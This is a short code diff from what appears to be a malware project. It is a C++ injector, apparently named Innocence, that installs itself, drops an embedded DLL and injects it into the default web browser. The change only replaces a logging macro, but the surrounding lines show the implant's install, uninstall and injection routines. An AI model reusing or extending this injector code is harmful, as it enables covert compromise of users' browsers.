@@ -27,7 +27,7 @@ namespace Inhibiter
 
     void InhibiterCore::install()
     {
-        FUNC_LOG(__FUNCTION__);
+        TRACE_FUNCTION
         // par défaut, si il existe déja un exécutale de l'injecteur, celui-ci est directement remplacé.
         if(CopyFile(current_executable_path.c_str(), executable_path.c_str(), FALSE) == FALSE)
         {
@@ -43,7 +43,7 @@ namespace Inhibiter
 
     void InhibiterCore::uninstall()
     {
-        FUNC_LOG(__FUNCTION__);
+        TRACE_FUNCTION
         // efface la DLL d'inhibition
         if(!DeleteFile(dll_path.c_str()))
         {
@@ -55,7 +55,7 @@ namespace Inhibiter
 
     void InhibiterCore::finishUninstall()
     {
-        FUNC_LOG(__FUNCTION__);
+        TRACE_FUNCTION
         LOG << "Temporary exe, deleting injector";
         if(!DeleteFile(executable_path.c_str()))
         {
@@ -82,7 +82,7 @@ namespace Inhibiter
 
     void InhibiterCore::inject()
     {
-        FUNC_LOG(__FUNCTION__);
+        TRACE_FUNCTION
         Sleep(1000);
         Malicious::BinaryRessource substrate(SlaveDll, sizeof(SlaveDll), dll_path);
         if(Innocence::INJECT_DEFAULT_BROWSER)
